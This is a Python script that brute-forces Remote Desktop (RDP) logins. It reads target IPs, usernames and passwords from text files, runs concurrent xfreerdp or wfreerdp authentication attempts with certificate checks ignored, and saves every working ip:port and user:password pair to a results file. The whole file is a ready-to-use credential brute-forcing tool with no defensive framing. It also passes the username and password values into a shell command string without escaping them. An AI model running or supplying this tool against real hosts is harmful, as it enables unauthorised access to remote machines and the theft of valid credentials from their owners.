import asyncio
from platform import system as sys_ver
from asyncio import create_subprocess_shell as run
from asyncio.subprocess import DEVNULL


good = 0
completed = 0


# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'


async def connect(sem, ip, user, password):
    async with sem:
        global good, completed

        completed += 1
        combo_num = len(ips)*len(users)*len(passwords)
        print(f'Good: {good}; Completed: {completed}/{combo_num}', end="\r")

        try:
            r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
                    f"/p:'{password}' /cert-ignore +auth-only " + \
                    '+compression /sec:nla'

            a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
            await a.communicate()

            if a.returncode == 0:
                good += 1
                rez = f'{ip}:{port};{user}:{password}\n'
                open('rez/good.txt', 'a', encoding='utf-8').write(rez)

            return
        except:
            return


async def start():
    tasks = []
    sem = asyncio.Semaphore(threads)

    for user in users:
        for passw in passwords:
            for ip in ips:
                task = asyncio.ensure_future(connect(sem, ip, user, passw))
                tasks.append(task)

        responses = asyncio.gather(*tasks)

        await responses


if __name__ == "__main__":

    # VARs

    threads = int(input('Threads: '))
    port = int(input('Port: ') or 3389)

    with open('data/ip.txt', "r", encoding="utf-8") as ip_data:
        ips = ip_data.read().splitlines()

    with open('data/users.txt', "r", encoding="utf-8") as user_data:
        users = user_data.read().splitlines()

    with open('data/passwords.txt', "r", encoding="utf-8") as password_data:
        passwords = password_data.read().splitlines()

    # END WARS

    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(start())
    loop.run_until_complete(future)
